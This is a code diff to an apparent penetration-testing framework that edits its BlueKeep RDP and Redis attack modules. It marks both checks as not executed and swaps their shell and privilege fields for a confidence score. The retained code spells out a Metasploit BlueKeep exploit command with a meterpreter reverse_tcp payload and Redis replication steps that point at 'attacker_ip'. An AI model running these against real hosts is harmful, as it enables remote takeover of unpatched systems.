@@ -31,9 +31,10 @@ class RDPBlueKeep(AttackModule):
             note=(
                 "RDP use-after-free RCE (CVE-2019-0708). Affects unpatched "
                 "Win XP/7/Server 2003/2008/2008R2. NLA-enabled RDP is NOT "
-                "vulnerable. Lands as SYSTEM."
+                "vulnerable. A working exploit lands as SYSTEM — this recipe "
+                "only checks applicability, it does not execute."
             ),
-            evidence=[f"BlueKeep (CVE-2019-0708) applicable to {ctx.target_ip}"],
+            evidence=[f"BlueKeep (CVE-2019-0708) check queued against {ctx.target_ip} (not executed)"],
             references=[
                 "https://nvd.nist.gov/vuln/detail/CVE-2019-0708",
                 "https://www.rapid7.com/db/modules/exploit/windows/rdp/cve_2019_0708_bluekeep_rce/",
@@ -42,8 +43,7 @@ class RDPBlueKeep(AttackModule):
                 f"exploit/windows/rdp/cve_2019_0708_bluekeep_rce RHOSTS={ctx.target_ip} "
                 f"PAYLOAD=windows/x64/meterpreter/reverse_tcp LHOST=<op_callback> LPORT=4444"
             ),
-            shell_type="meterpreter",
-            privilege_level="system",
+            confidence=0.4,
         )
 
 
@@ -113,8 +113,7 @@ class RedisExploit(AttackModule):
                 "CONFIG SET dbfilename root",
                 "SLAVEOF attacker_ip 6379 (master must be allowlisted)",
             ],
-            shell_type="reverse",
-            privilege_level="root",
+            confidence=0.4,
         )
 
 
